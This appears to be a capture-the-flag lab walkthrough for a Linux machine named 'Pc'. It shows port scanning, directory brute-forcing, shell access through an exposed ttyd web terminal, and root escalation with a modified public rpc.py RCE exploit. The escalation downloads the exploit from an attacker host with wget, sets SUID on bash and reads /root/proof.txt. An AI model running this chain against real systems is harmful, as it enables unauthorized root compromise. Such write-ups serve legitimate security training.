# 🐧 Pc

## Enumerating Services

First, we'll perform a generic scan to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.229.210

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
8000/tcp open  http-alt ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-title: ttyd - Terminal
```

## Enumerating port 22

We run nmap to check the authentications possible through ssh.

```shell
# Check authentication methods
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.229.210

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

## Enumerating port 8000

We used feroxbuster to enumerate port 8000 and only found the token path.

```shell
# Enum dir
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 1 -x php,asp,aspx,html,txt,pdf -C 404,502 -u http://192.168.229.210:8000

http://192.168.229.210:8000/token
```

## Initial Access

We navigate to the web page and find a terminal through the browser itself. As we don't find the local.txt flag, we assume that there is only the root flag on this machine.

## Privilege Escalation

Enumerating the machine we find a python script in the opt directory.

```shell
# Enum dir
user@pc:/home/user$ ls -lah /opt
total 16K
drwxr-xr-x  3 root root 4.0K Aug 25  2023 .
drwxr-xr-x 19 root root 4.0K Jun 15  2022 ..
drwx--x--x  4 root root 4.0K Jun 28  2023 containerd
-rw-r--r--  1 root root  625 Aug 25  2023 rpc.py
```

The script creates an RPC server on port 65432. We found a public exploit for this service.

```shell
# Public Exploit
searchsploit rpc.py
rpc.py 0.6.0 - Remote Code Execution (RCE)                  | python/remote/50983.py

searchsploit -m 50983
```

We corrected the code by removing all occurrences of the string "3D" and changing the `exec_command` parameter to configure SUID for bash.

```shell
# Transfer
wget http://192.168.45.242/50983.py
chmod +x 50983.py

# Privilege Escalation
python3 ./50983.py
bash -p
```

## Post-Exploitation

With root privileges, we capture the target's flags.

```shell
# Evidence
cat /root/proof.txt
146f6cab329a1ae0dc60c881a6cfec7e
```
